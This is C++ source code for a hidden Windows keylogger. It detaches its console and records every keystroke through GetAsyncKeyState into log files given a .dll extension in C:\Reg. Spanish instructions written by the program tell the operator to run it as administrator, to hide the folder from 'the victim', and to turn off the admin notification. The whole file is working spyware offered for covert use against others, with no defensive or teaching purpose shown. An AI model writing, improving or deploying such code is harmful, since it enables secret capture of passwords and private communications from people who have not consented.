#include <cstdlib>
#include <iostream>
#include <fstream>
#include <windows.h>
#include <time.h>
#include <cstdio>
using namespace std;
bool file_exists(const char * f){
    ifstream file;
    file.open(f);
    if(file.fail())
        return false;
    file.close();
    return true;
}
int main(){
FreeConsole();
string registro="";
int cont=0;
char ruta[100];
time_t t;
struct tm *tm;
char fechayhora[100];
  t=time(NULL);
  tm=localtime(&t);
  strftime(fechayhora,100,"Day %d-%m-%Y Time %I-%M%p", tm);
  if(file_exists("C:\\Reg\\info.txt")==false){
        system("cd C:\\&&MD Reg");

          cont=5;}

  strcpy(ruta,"C:\\Reg\\");
  strcat(ruta,fechayhora);
  strcat(ruta,".dll");
  ofstream start("C:\\Reg\\info.txt");
  start<<"Primer uso de este software :3\nEste programa genera un registro de las actividades del teclado.\n";
  start<<"automatica genera una carpeta llamada Reg ,Te recomiendo que \nla ocultes para evitar que la victima lo vea.\n";
  start<<"Cierra esta ventana y espera \n\n";
  start<<"Instrucciones:\n";
start<<"1.Ejecutar la aplicación como administrador.\n";
start<<"2.Ejecutar el archivo inicio.bat como administrador de encuentra en C:/Reg.\n";
start<<"3.Esconde la carpeta Reg que s encuentra en disco C: de la vista.\n";
start<<"4. es opcional pero se recomienda quitar la notificación de administardor.\n";
start<<"Pd: los archivos dll los puedes abrir con bloc de notas, en estos archivos se encuntran los registos.\n";
start<<"Pd2: La aplicacion trabaja de manera oculta en el sistema y este mensaje solo saldra la primera vez";
  start.close();
  if(cont==5){system("start C:\\Reg\\info.txt");}
 cout<<ruta<<endl;

while(1){
       ofstream log(ruta, ios::app);
  if(GetAsyncKeyState('Q')==-32767){registro+='q';}
           if (GetAsyncKeyState('W')==-32767){registro+='w';}
           if (GetAsyncKeyState('E')==-32767){registro+='e';}
           if (GetAsyncKeyState('R')==-32767){registro+='r';}
           if (GetAsyncKeyState('T')==-32767){registro+='t';}
           if (GetAsyncKeyState('Y')==-32767){registro+='y';}
           if (GetAsyncKeyState('U')==-32767){registro+='u';}
           if (GetAsyncKeyState('I')==-32767){registro+='i';}
           if (GetAsyncKeyState('O')==-32767){registro+='o';}
           if (GetAsyncKeyState('P')==-32767){registro+='p';}
           if (GetAsyncKeyState('A')==-32767){registro+='a';}
           if (GetAsyncKeyState('S')==-32767){registro+='s';}
           if (GetAsyncKeyState('D')==-32767){registro+='d';}
           if (GetAsyncKeyState('F')==-32767){registro+='f';}
           if (GetAsyncKeyState('G')==-32767){registro+='g';}
           if (GetAsyncKeyState('H')==-32767){registro+='h';}
           if (GetAsyncKeyState('J')==-32767){registro+='j';}
           if (GetAsyncKeyState('K')==-32767){registro+='k';}
           if (GetAsyncKeyState('L')==-32767){registro+='l';}
           if (GetAsyncKeyState('Z')==-32767){registro+='z';}
           if (GetAsyncKeyState('X')==-32767){registro+='x';}
           if (GetAsyncKeyState('C')==-32767){registro+='c';}
           if (GetAsyncKeyState('V')==-32767){registro+='v';}
           if (GetAsyncKeyState('B')==-32767){registro+='b';}
           if (GetAsyncKeyState('N')==-32767){registro+='n';}
           if (GetAsyncKeyState('M')==-32767){registro+='m';}
           if (GetAsyncKeyState('1')==-32767){registro+='1';}
           if (GetAsyncKeyState('2')==-32767){registro+='2';}
           if (GetAsyncKeyState('3')==-32767){registro+='3';}
           if (GetAsyncKeyState('4')==-32767){registro+='4';}
           if (GetAsyncKeyState('5')==-32767){registro+='5';}
           if (GetAsyncKeyState('6')==-32767){registro+='6';}
           if (GetAsyncKeyState('7')==-32767){registro+='7';}
           if (GetAsyncKeyState('8')==-32767){registro+='8';}
           if (GetAsyncKeyState('9')==-32767){registro+='9';}
           if (GetAsyncKeyState('0')==-32767){registro+='0';}
           if (GetAsyncKeyState(13)==-32767){registro+="\n";}
           if (GetAsyncKeyState(8)==-32767){registro+="<Del>";}
           if (GetAsyncKeyState(9)==-32767){registro+="<Tab>";}
           if (GetAsyncKeyState(32)==-32767){registro+=" ";}
           if (GetAsyncKeyState(91)==-32767){registro+="<Start>";}
           if (GetAsyncKeyState(107)==-32767){registro+="+";}
           if (GetAsyncKeyState(109)==-32767||GetAsyncKeyState(189)==-32767){registro+="-";}
           if (GetAsyncKeyState(106)==-32767){registro+="*";}
           if (GetAsyncKeyState(111)==-32767){registro+="/";}
           if (GetAsyncKeyState(17)==-32767){registro+="<Ctrl>";}
           if (GetAsyncKeyState(18)==-32767){registro+="<Alt>";}
           if (GetAsyncKeyState(27)==-32767){registro+="<Esc>";}
           if (GetAsyncKeyState(161)==-32767){registro+="<Shift>";}
           if (GetAsyncKeyState(20)==-32767){registro+="<B.Mayus>";}
           cout<<registro;
        log<<registro;registro="";
       cont++;
       log.close();
 }/*while*/
 return 0;
}
